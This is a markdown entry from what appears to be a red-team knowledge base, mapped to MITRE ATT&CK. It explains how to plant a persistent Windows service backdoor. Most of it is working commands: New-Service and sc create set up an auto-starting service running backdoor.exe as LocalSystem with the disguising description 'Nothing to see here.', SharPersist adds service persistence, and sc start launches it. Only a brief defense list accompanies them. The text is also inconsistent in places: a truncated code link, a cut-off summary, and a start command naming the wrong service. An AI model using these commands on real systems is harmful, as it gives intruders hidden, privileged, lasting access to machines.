---
id: 1f29e6e5-06d9-49bf-875e-786c7219385f
name: Windows - Elevated Services Backdoor Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:28.105024+00:00'
updated_at: '2023-04-10T20:37:29.706530+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Service Execution|T1035 - Service Execution]]'
- '[[Service Registry Permissions Weakness|T1058 - Service Registry Permissions Weakness]]'
tags:
- '[[Elevated]]'
- '[[Services Elevated]]'
- '[[Windows - Persistence]]'
commands:
- '[[Create Backdoor Persistence using SharPersist]]'
- '[[Create Backdoor Service]]'
- '[[Create Backdoor Service using sc]]'
- '[[Start Backdoor Service]]'
- '[[Start Backdoor Service using sc]]'
---

# Windows - Elevated Services Backdoor Persistence

## Summary

This procedure involves creating a backdoor service that runs with elevated privileges, providing a persistent access point for an attacker. This can be achieved by creating a new service or modifying an existing one with weak permissions. The backdoor service can be used to maintain access to the 

## Description

# Description

This procedure involves creating a backdoor service that runs with elevated privileges, providing a persistent access point for an attacker. This can be achieved by creating a new service or modifying an existing one with weak permissions. The backdoor service can be used to maintain access to the system, exfiltrate data, or execute further attacks. From a technical perspective, the attacker needs to have administrative privileges to create or modify services. From a business standpoint, this type of attack can result in the compromise of sensitive data, intellectual property theft, or disruption of critical systems.

 

## Requirements

1. Administrative privileges on the target system

 

## Defense

1. Regularly review and update service permissions to ensure they are not weak

1. Monitor for new services or modifications to existing ones

1. Implement application whitelisting to prevent unauthorized service creation or modification

 

## Objectives

1. Create a backdoor service with elevated privileges

1. Maintain persistent access to the compromised system

1. Exfiltrate sensitive data or execute further attacks

 

# Instructions

1. To create a backdoor service that will start automatically or on-demand, run the following commands in PowerShell:

 



**Code**: [[# Powershell
New-Service -Name "Backdoor" -BinaryP]]



> This command creates a Windows service named 'Backdoor' that will execute the binary located at 'C:\Windows\Temp\backdoor.exe'. The service is set to start automatically and has a description of 'Nothing to see here.'. The 'sc start pentestlab' command is used to start the service.

The 'SharPersist' tool is used to create a persistence mechanism for the backdoor. It creates a new service with the name 'Backdoor' that executes the command 'C:\Windows\System32\cmd.exe /c backdoor.exe' when started. The '-m add' option is used to add the new service. 

The 'sc' command is used to create a new service named 'Backdoor' that executes the command 'cmd.exe /k C:\temp\backdoor.exe' when started. The service is set to start automatically and runs as the 'LocalSystem' account. The 'sc start Backdoor' command is used to start the service.



**Command** ([[Create Backdoor Service]]):

```bash
New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
```





**Command** ([[Start Backdoor Service]]):

```bash
sc start pentestlab
```





**Command** ([[Create Backdoor Persistence using SharPersist]]):

```bash
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
```





**Command** ([[Create Backdoor Service using sc]]):

```bash
sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
```





**Command** ([[Start Backdoor Service using sc]]):

```bash
sc start Backdoor
```



## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Service Execution|T1035 - Service Execution]]
- [[Service Registry Permissions Weakness|T1058 - Service Registry Permissions Weakness]]

## Commands Used

- [[Create Backdoor Persistence using SharPersist]]
- [[Create Backdoor Service]]
- [[Create Backdoor Service using sc]]
- [[Start Backdoor Service]]
- [[Start Backdoor Service using sc]]

## Tags

- [[Elevated]]
- [[Services Elevated]]
- [[Windows - Persistence]]


